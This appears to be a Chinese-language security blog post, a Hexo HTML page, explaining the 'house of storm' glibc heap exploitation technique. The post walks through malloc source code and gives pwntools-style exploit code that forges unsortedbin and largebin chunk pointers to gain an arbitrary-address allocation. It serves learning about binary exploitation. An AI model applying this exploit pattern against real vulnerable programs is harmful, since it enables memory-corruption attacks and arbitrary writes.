@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+
+    
+      <link rel="icon" href="/favicon.png" />
+    
+
+    <title>
+        
+          house of storm - C12en
+        
+    </title>
+
+    <!-- Spectre.css framework -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-exp.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/spectre.css/0.5.9/spectre-icons.min.css">
+
+    <!-- theme css & js -->
+    
+<link rel="stylesheet" href="/css/book.css">
+
+    
+<script src="/js/book.js"></script>
+
+
+    <!-- tocbot -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    
+    <!-- katex -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const zooming = new Zooming()
+    zooming.listen('.book-content img')
+})
+</script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+
+<div class="book-container">
+  <div class="book-sidebar">
+    <div class="book-brand">
+  <a href="/">
+    <img src="/favicon.png">
+    <span>C12EN</span>
+  </a>
+</div>
+    <div id="menu" class="book-menu hide">
+  
+</div>
+
+
+<script src="/js/book-menu.js"></script>
+
+  </div>
+
+  <div class="sidebar-toggle" onclick="sidebar_toggle()" onmouseover="add_inner()" onmouseleave="remove_inner()">
+  <div class="sidebar-toggle-inner"></div>
+</div>
+
+<script>
+function add_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.add('show')  
+}
+
+function remove_inner() {
+  let inner = document.querySelector('.sidebar-toggle-inner')
+  inner.classList.remove('show')
+}
+
+function sidebar_toggle() {
+    let sidebar_toggle = document.querySelector('.sidebar-toggle')
+    let sidebar = document.querySelector('.book-sidebar')
+    let content = document.querySelector('.off-canvas-content')
+    if (sidebar_toggle.classList.contains('extend')) { // show
+        sidebar_toggle.classList.remove('extend')
+        sidebar.classList.remove('hide')
+        content.classList.remove('extend')
+    }
+    else { // hide
+        sidebar_toggle.classList.add('extend')
+        sidebar.classList.add('hide')
+        content.classList.add('extend')
+    }
+}
+</script>
+
+  <div class="off-canvas-content">
+    <div class="columns">
+      <div class="column col-10 col-lg-12">
+        <div class="book-navbar">
+          <!-- For Responsive Layout -->
+
+<header class="navbar">
+  <section class="navbar-section">
+    <a onclick="open_sidebar()">
+      <i class="icon icon-menu"></i>
+    </a>
+  </section>
+</header>
+
+        </div>
+        <div class="book-content">
+          <div class="book-post">
+  <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一种结合了unsortedbin attack和largebin attack的攻击办法 可以达到任意地址写的效果</p>
+<p>在学习这两个漏洞的时候 其各自效能不大 unsortedbin 受限于对于fake chunk的size域和bk域的检查</p>
+<p>largebin attack受限于其只能单一的在任意地址写堆地址</p>
+<p>但是如果将二者结合起来 就可以达到任意地址申请chunk的效果</p>
+<p>不过这个办法也是旧时代的眼泪了 在libc2.30以后就诞生了新的检查机制来防止</p>
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>首先我们要清楚整个漏洞的触发流程 先是利用unsortedbin chunk放入到largebin chunk中 从而将fake chunk链入unsorted_chunks (av)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">   unsorted_chunks (av)-&gt;bk = bck;  <span class="comment">// 把 fake_chunk 链入 unsorted_chunks(av)</span></span><br><span class="line">   bck-&gt;fd = unsorted_chunks (av);  <span class="comment">// 把 fake_chunk 的 fd 改成 unsorted_chunks (av)</span></span><br></pre></td></tr></table></figure>
+
+<p>同时还可以将fake chunk的fd域修改为unsorted_chunks (av)</p>
+<p>为了达到这一目的 我们就需要更改unsortedbin chunk的bk域为fakechunk_addr - 0x10</p>
+<p>这里之所以还要减去0x10 是为了腾出size域和prev_size域的空间</p>
+<p>紧接着我们需要利用largebin attack来写fake chunk的size域 以及完善fake chunk的结构 以供绕过双向链表的检测</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd; <span class="comment">//unsortedbin的fd_nextsize域被设置为了largebin chunk的首地址</span></span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; <span class="comment">//unsortebin的bk_nextsize域被设置为largebin的bk_nextsize</span></span><br><span class="line">                          fwd-&gt;bk_nextsize = victim; <span class="comment">//把largebin的bk_nextsize域设置为unsortedbin的首地址</span></span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="comment">//这里就是伪造size的关键句 将unsortedbin的bk_nextsize指向的地址+0x20处填入unsortedbin地址</span></span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;  <span class="comment">//把 unsorted bin 里刚放进的 chunk-&gt;bk 改为 large bin-&gt;bk</span></span><br><span class="line">          victim-&gt;fd = fwd;  <span class="comment">//把 unsorted bin 里刚放进的 chunk-&gt;fd 改为 large bin</span></span><br><span class="line">          fwd-&gt;bk = victim;  <span class="comment">//把 large bin 的 chunk-&gt;bk 改为 unsorted bin 里刚放进的 chunk 的首地址</span></span><br><span class="line">          bck-&gt;fd = victim;  <span class="comment">//这里伪造了fake chunk的bk域 </span></span><br><span class="line"><span class="comment">//bck = fwd-&gt;bk</span></span><br><span class="line"><span class="comment">//bck-&gt;fd = (fwd-&gt;bk)+0x10</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h2><p>为了配合上述的源代码 我们需要将两个chunk的布局构造成下面这样</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ptr_addr = 你想要任意写的地址-<span class="number">0x10</span></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(ptr_addr) <span class="comment">#unsortedbin</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(ptr_addr+<span class="number">0x8</span>)+p64(<span class="number">0</span>)+p64(ptr_addr-<span class="number">0x18</span>-<span class="number">5</span>) <span class="comment">#largebin</span></span><br></pre></td></tr></table></figure>
+
+<p>具体的数值计算就自己根据源码来看了 应该挺好懂的  还有一点需要注意的就是unsoretbin chunk和largebin chunk的释放时机</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x418</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x408</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#2  largebin</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#4  unsortedbin</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">ptr_addr = <span class="number">0xABCD0500</span>-<span class="number">0x10</span></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(ptr_addr)</span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(ptr_addr+<span class="number">0x8</span>)+p64(<span class="number">0</span>)+p64(ptr_addr-<span class="number">0x18</span>-<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x48</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">debug()</span><br></pre></td></tr></table></figure>
+
+<p>你可以看到 要先释放largebin chunk 这是因为要将size小的放在链表头 不然后续无法将其放入largebin</p>
+<p>总体利用还是比较简单的 难在理解</p>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
+    <div class="book-post-meta">
+
+  <div class="author">
+
+    <!-- Author image -->
+    <div class="author-img">
+      
+        <figure
+          class="avatar avatar-lg"
+          data-initial="C"
+          style="background-color: #3b4351;">
+        </figure>
+      
+    </div>
+
+    <!-- Author title -->
+    <div class="author-title">
+      <div>C12en</div>
+      <div>2023-03-13</div>
+    </div>
+  </div>
+
+  
+    <div class="divider"></div>
+
+    <div class="link">
+      <a class="category-link" href="/categories/heap/">heap</a>
+
+      
+    </div>
+    
+  
+
+  <div class="divider"></div>
+</div>
+  
+
+  <div class="book-tocbot">
+</div>
+<div class="book-tocbot-menu">
+  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+  <a onclick="go_top()">Back to top</a>
+  <a onclick="go_bottom()">Go to bottom</a>
+</div>
+
+
+<script src="/js/book-toc.js"></script>
+
+</div>
+      </div>
+    </div>
+  </div>
+  
+  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
+</div>
+
+</body>
+</html>
+
+
+<script src="/js/book.js"></script>
